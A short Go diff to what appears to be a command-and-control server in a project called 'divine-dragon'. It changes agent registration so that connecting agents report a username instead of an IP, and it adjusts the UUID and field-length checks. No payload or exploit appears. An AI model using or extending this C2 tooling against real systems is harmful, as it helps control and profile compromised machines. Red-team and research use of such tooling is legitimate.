@@ -4,7 +4,6 @@ import (
 	"divine-dragon/util"
 	"fmt"
 	"io"
-	"net"
 	"os"
 	"path/filepath"
 	"time"
@@ -28,13 +27,13 @@ type C2Server struct {
 type connectAgent struct {
 	Uuid     string `form:"uuid" json:"uuid" binding:"required"`
 	Hostname string `form:"hostname" json:"hostname" binding:"required"`
-	Ip       string `form:"ip" json:"ip" binding:"required"`
+	Username string `form:"username" json:"username" binding:"required"`
 }
 
 type Agent struct {
 	Uuid     string
 	Hostname string
-	Ip       string
+	Username string
 }
 type login struct {
 	Username string `form:"username" json:"username" binding:"required"`
@@ -152,13 +151,13 @@ func (c2s *C2Server) initAgentJWTMiddleware() (*jwt.GinJWTMiddleware, error) {
 			}
 			uuid := connectAgentVars.Uuid
 			hostname := connectAgentVars.Hostname
-			ip := connectAgentVars.Ip
+			username := connectAgentVars.Username
 
-			if len(uuid) == 16 && len(hostname) < 16 && net.ParseIP(ip) != nil {
+			if len(uuid) == 36 && len(hostname) < 16 && len(username) <= 256 {
 				newAgent := Agent{
 					Uuid:     uuid,
 					Hostname: hostname,
-					Ip:       ip,
+					Username: username,
 				}
 				c2s.activeAgents = append(c2s.activeAgents, newAgent)
 				return &newAgent, nil
